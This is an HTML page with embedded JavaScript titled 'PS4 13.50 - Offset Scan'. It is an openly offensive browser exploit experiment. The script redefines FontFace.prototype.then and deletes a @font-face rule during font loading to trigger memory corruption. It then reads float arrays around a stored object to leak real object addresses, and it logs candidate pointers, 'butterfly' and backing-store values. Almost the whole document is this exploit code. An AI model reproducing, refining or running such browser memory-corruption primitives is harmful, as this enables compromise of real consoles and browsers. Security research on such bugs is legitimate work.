<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 13.50 - Offset Scan</title>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    body {
        font-family: 'Courier New', monospace;
        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
        color: #00ff41;
        min-height: 100vh;
        padding: 20px;
    }
    
    .container {
        max-width: 1400px;
        margin: 0 auto;
    }
    
    .header {
        text-align: center;
        padding: 30px 0;
        background: rgba(0, 255, 65, 0.05);
        border: 2px solid #00ff41;
        border-radius: 15px;
        margin-bottom: 30px;
        box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
    }
    
    .header h1 {
        font-size: 2.2em;
        text-shadow: 0 0 20px rgba(0, 255, 65, 0.8);
        margin-bottom: 10px;
        letter-spacing: 3px;
    }
    
    .header .subtitle {
        font-size: 1.1em;
        color: #00cc33;
        letter-spacing: 2px;
    }
    
    .btn {
        display: block;
        margin: 0 auto 30px;
        padding: 20px 50px;
        font-size: 1.4em;
        font-weight: bold;
        border: 3px solid #00ff41;
        background: linear-gradient(135deg, rgba(0, 255, 65, 0.1) 0%, rgba(0, 255, 65, 0.2) 100%);
        color: #00ff41;
        cursor: pointer;
        border-radius: 10px;
        transition: all 0.3s ease;
        font-family: 'Courier New', monospace;
        text-transform: uppercase;
        letter-spacing: 2px;
        box-shadow: 0 5px 15px rgba(0, 255, 65, 0.3);
    }
    
    .btn:hover {
        background: linear-gradient(135deg, rgba(0, 255, 65, 0.2) 0%, rgba(0, 255, 65, 0.4) 100%);
        box-shadow: 0 8px 25px rgba(0, 255, 65, 0.5);
        transform: translateY(-3px);
    }
    
    .log-container {
        background: rgba(0, 0, 0, 0.8);
        border: 2px solid #00ff41;
        border-radius: 10px;
        padding: 20px;
        box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
    }
    
    .log-header {
        font-size: 1.2em;
        margin-bottom: 15px;
        padding-bottom: 10px;
        border-bottom: 2px solid #00ff41;
        text-transform: uppercase;
        letter-spacing: 2px;
    }
    
    #log {
        font-size: 0.9em;
        line-height: 1.6;
        max-height: 600px;
        overflow-y: auto;
        white-space: pre-wrap;
        word-wrap: break-word;
        padding: 10px;
        background: rgba(0, 0, 0, 0.5);
        border-radius: 5px;
    }
    
    #log::-webkit-scrollbar {
        width: 10px;
    }
    
    #log::-webkit-scrollbar-track {
        background: rgba(0, 255, 65, 0.1);
        border-radius: 5px;
    }
    
    #log::-webkit-scrollbar-thumb {
        background: #00ff41;
        border-radius: 5px;
    }
    
    .success { color: #00ff41; font-weight: bold; }
    .error { color: #ff3366; font-weight: bold; }
    .warning { color: #ffaa00; }
    .info { color: #00ccff; }
    .highlight { color: #ff00ff; font-weight: bold; }
    .pattern { color: #666; }
</style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>◈ OFFSET SCAN ◈</h1>
        <div class="subtitle">Finding real address at memory offsets</div>
    </div>
    
    <button class="btn" onclick="runTest()">► SCAN OFFSETS</button>
    
    <div class="log-container">
        <div class="log-header">◈ SCAN RESULTS ◈</div>
        <div id="log"></div>
    </div>
</div>

<script>
"use strict";

let logBuf = [];

function log(msg) {
    logBuf.push(msg);
    let d = document.getElementById('log');
    if (d) {
        d.innerHTML = logBuf.map(line => {
            let className = '';
            if (line.includes('[+++]') || line.includes('REAL ADDRESS')) className = 'success';
            else if (line.includes('[ERROR]')) className = 'error';
            else if (line.includes('[!]')) className = 'warning';
            else if (line.includes('[DIFF]')) className = 'highlight';
            else if (line.includes('[+]')) className = 'info';
            else if (line.includes('pattern')) className = 'pattern';
            
            return `<span class="${className}">${line}</span>`;
        }).join('\n');
        d.scrollTop = d.scrollHeight;
    }
}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = d;
        let parts = new Uint32Array(buf);
        return new Int64(parts[0], parts[1]);
    }
    
    toString() {
        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
    }
}

function runTest() {
    logBuf = [];
    
    log('═══════════════════════════════════════════════════════');
    log('       OFFSET SCAN - FIND REAL ADDRESS                 ');
    log('═══════════════════════════════════════════════════════\n');
    
    log('[THEORY] Real address might be at offset from store point');
    log('[METHOD] Store object at index N, read indices N-5 to N+5\n');
    
    // Setup
    let style = document.createElement('style');
    style.id = 's';
    style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
    document.head.appendChild(style);
    
    let floatArray = new Float64Array(100);
    let objectArray = new Array(100);
    
    for (let i = 0; i < 100; i++) {
        floatArray[i] = 1.1 * (i + 1);
        objectArray[i] = { id: i };
    }
    
    log('[SETUP] Arrays created\n');
    
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    
    let fired = false;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                log('[*] Inside getter\n');
                
                // Create corrupted fonts
                let corrupted = [];
                for (let i = 0; i < 50; i++) {
                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                        unicodeRange: 'U+' + (0x100 + i).toString(16)
                    }));
                }
                
                // Trigger
                document.getElementById('s').sheet.deleteRule(0);
                document.body.offsetTop;
                
                log('[CORRUPTION] Active\n');
                
                // Required setup
                log('[SETUP] Tests 1-3...');
                try {
                    let v1 = corrupted[0];
                    let _ = v1.status;
                    let v2 = corrupted[1];
                    v2.prop = { x: 1 };
                    let v3 = corrupted[2];
                    floatArray[50] = v3;
                    log('[SETUP] ✓ Complete\n');
                } catch(e) {
                    log('[SETUP] ! Error\n');
                }
                
                // ═══════════════════════════════════════════
                // MAIN SCAN: Read surrounding indices
                // ═══════════════════════════════════════════
                
                log('╔════════════════════════════════════════════════╗');
                log('║         SCANNING OFFSETS -10 to +10            ║');
                log('╚════════════════════════════════════════════════╝\n');
                
                let targetObj = { 
                    marker: 0xDEADBEEF, 
                    test: "TARGET",
                    id: 9999 
                };
                
                let storeIdx = 50;
                
                log('[*] Target object: ' + JSON.stringify(targetObj));
                log('[*] Storing at objectArray[' + storeIdx + ']\n');
                
                objectArray[storeIdx] = targetObj;
                
                log('[SCAN] Reading floatArray[' + (storeIdx-10) + '] through [' + (storeIdx+10) + ']:\n');
                
                let findings = [];
                
                for (let offset = -10; offset <= 10; offset++) {
                    let readIdx = storeIdx + offset;
                    
                    if (readIdx < 0 || readIdx >= floatArray.length) continue;
                    
                    try {
                        let value = floatArray[readIdx];
                        let addr = Int64.fromDouble(value);
                        
                        // Calculate expected pattern
                        let expectedPattern = 1.1 * (readIdx + 1);
                        let changed = Math.abs(value - expectedPattern) > 0.01;
                        
                        // Build output
                        let offsetStr = (offset >= 0 ? '+' : '') + offset;
                        let idxStr = '[' + readIdx + ']';
                        let addrStr = addr.toString();
                        
                        let note = '';
                        
                        if (!changed) {
                            note = '(pattern)';
                        } else {
                            // Check what changed
                            if ((addr.high & 0xfff80000) === 0x7ff80000) {
                                note = '[NaN-boxed]';
                                findings.push({ offset, addr, type: 'nanbox' });
                            } else if (addr.high >= 0x01000000) {
                                note = '[DIFF - high word!]';
                                findings.push({ offset, addr, type: 'highword' });
                            } else if (addr.low !== 0) {
                                note = '[DIFF - low word]';
                                findings.push({ offset, addr, type: 'lowword' });
                            } else {
                                note = '[changed]';
                            }
                        }
                        
                        log(offsetStr.padStart(4, ' ') + ' ' + idxStr.padEnd(5, ' ') + ' ' + addrStr + ' ' + note);
                        
                    } catch(e) {
                        log(offset.toString().padStart(4, ' ') + ' ERROR: ' + e.message);
                    }
                }
                
                log('\n');
                
                // ═══════════════════════════════════════════
                // TEST MULTIPLE OBJECTS
                // ═══════════════════════════════════════════
                
                log('╔════════════════════════════════════════════════╗');
                log('║     TESTING MULTIPLE OBJECTS AT OFFSETS        ║');
                log('╚════════════════════════════════════════════════╝\n');
                
                if (findings.length > 0) {
                    log('[*] Found ' + findings.length + ' interesting offsets');
                    log('[*] Testing with different objects...\n');
                    
                    let testObjs = [
                        { name: "obj1", m: 0x1111 },
                        { name: "obj2", m: 0x2222 },
                        { name: "obj3", m: 0x3333 }
                    ];
                    
                    for (let findingIdx = 0; findingIdx < Math.min(3, findings.length); findingIdx++) {
                        let finding = findings[findingIdx];
                        
                        log('[OFFSET ' + finding.offset + '] Testing with 3 objects:');
                        
                        for (let objIdx = 0; objIdx < testObjs.length; objIdx++) {
                            let obj = testObjs[objIdx];
                            objectArray[storeIdx] = obj;
                            
                            let readIdx = storeIdx + finding.offset;
                            let leaked = floatArray[readIdx];
                            let addr = Int64.fromDouble(leaked);
                            
                            log('  ' + obj.name + ' → ' + addr.toString());
                        }
                        log('');
                    }
                }
                
                // ═══════════════════════════════════════════
                // ANALYSIS
                // ═══════════════════════════════════════════
                
                log('╔════════════════════════════════════════════════╗');
                log('║              ANALYSIS                          ║');
                log('╚════════════════════════════════════════════════╝\n');
                
                log('[FINDINGS]');
                log('  Total changed values: ' + findings.length);
                
                if (findings.length === 0) {
                    log('  [!] NO VALUES CHANGED from pattern');
                    log('  [!] Arrays might not be overlapping');
                    log('  [!] Try refreshing and running again');
                } else {
                    log('  Offsets with changes:');
                    findings.forEach(f => {
                        log('    ' + (f.offset >= 0 ? '+' : '') + f.offset + ': ' + f.addr.toString() + ' (' + f.type + ')');
                    });
                    
                    log('\n[INTERPRETATION]');
                    
                    let hasVaryingAddrs = false;
                    if (findings.length >= 3) {
                        // Check if addresses vary per object
                        log('  Testing if addresses vary per object...');
                        // This would need the multi-object test results
                        log('  Review multi-object test above');
                    }
                    
                    let nonNanBox = findings.filter(f => f.type !== 'nanbox');
                    if (nonNanBox.length > 0) {
                        log('  [+++] Found non-NaN-boxed values at offsets!');
                        log('  [+++] These might be real structure members!');
                        log('  [+++] Possible: butterfly, backing store, etc.');
                    }
                    
                    if (findings.some(f => f.type === 'highword')) {
                        log('  [+++] Found values with significant high word!');
                        log('  [+++] These are likely real pointers!');
                    }
                }
                
                log('\n[!] Returning - OOM will occur');
                log('═══════════════════════════════════════════════════════\n');
                
                window.findings = findings;
            }
            
            return undefined;
        }
    });
    
    log('[*] Starting scan...\n');
    document.fonts.load('1em x', 'AB');
}

log('═══════════════════════════════════════════════════════');
log('          OFFSET SCAN READY                            ');
log('═══════════════════════════════════════════════════════\n');
log('[INFO] This will scan indices around stored object');
log('[INFO] Looking for real address at offset\n');
log('[READY] Click SCAN OFFSETS\n');

</script>
</body>
</html>
